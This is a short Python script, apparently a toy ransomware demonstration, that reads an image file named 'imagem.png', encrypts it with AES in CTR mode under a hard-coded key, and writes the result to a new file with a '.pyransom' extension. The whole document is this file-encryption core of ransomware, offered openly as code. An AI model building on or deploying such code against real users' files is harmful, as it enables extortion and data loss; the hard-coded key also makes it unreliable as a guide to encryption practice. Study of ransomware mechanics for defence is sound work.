import pyaes

KEY = b'0123456789123456'
filename = 'imagem.png'

with open(filename, 'rb') as file:
    conteudo = file.read()

crypto_data = pyaes.AESModeOfOperationCTR(KEY).encrypt(conteudo)

new_filename = '{}.pyransom'.format(filename)
with open(new_filename, 'wb') as file:
    file.write(crypto_data)

